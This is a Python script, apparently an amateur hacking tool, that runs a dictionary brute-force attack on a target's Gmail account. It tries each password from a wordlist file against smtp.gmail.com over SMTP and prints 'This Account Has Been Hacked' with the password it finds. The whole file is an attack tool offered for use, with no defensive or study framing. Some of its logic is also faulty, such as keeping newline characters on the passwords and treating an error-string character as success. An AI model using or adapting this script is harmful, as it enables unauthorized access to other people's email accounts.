import smtplib
from os import system

def main():
    print('=================================================')
    print('#          created by B0T4K_K1NCL0NK             #')
    print('=================================================')
    print('#   +    +  ++++  +     +     +++++  +       +  #')
    print('#   +    +  +     +     +     +   +  +       +  #')
    print('#   +    +  +     +     +     +   + : +     +   #')
    print('#   ++++++  ++++  +     +     +   + :  +   +    #')
    print('#   +    +  +     +     +     +   + :   + +     #')
    print('#   +    +  ++++  ++++  ++++  +++++      +      #')
    print('=================================================')

    print('\n\n[1] Enter target email (gmail account)')
    print('\n\n[2] Exit')
    option = int(input('\n\nSelect One!!==> '))

    if option == 1:
        file_path = input('Path of passwords file (example: passlist.txt): ')
        login(file_path)
    else:
        system('clear')
        exit()

def login(file_path):
    user_name = input('Target email: ')
    pass_file = open(file_path, 'r')
    pass_list = pass_file.readlines()
    server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
    server.ehlo()

    for index, password in enumerate(pass_list, start=1):
        print(f'{index}/{len(pass_list)}')
        try:
            server.login(user_name, password)
            system('clear')
            main()
            print('\n')
            print(f'[+] This Account Has Been Hacked Password: {password} ^_^')
            break
        except smtplib.SMTPAuthenticationError as e:
            error = str(e)
            if error[14] == '<':
                system('clear')
                main()
                print(f'[+] This account has been hacked, password: {password} ^_^')
                break
            else:
                print(f'[!] Password not found: {password}')

    server.quit()

main()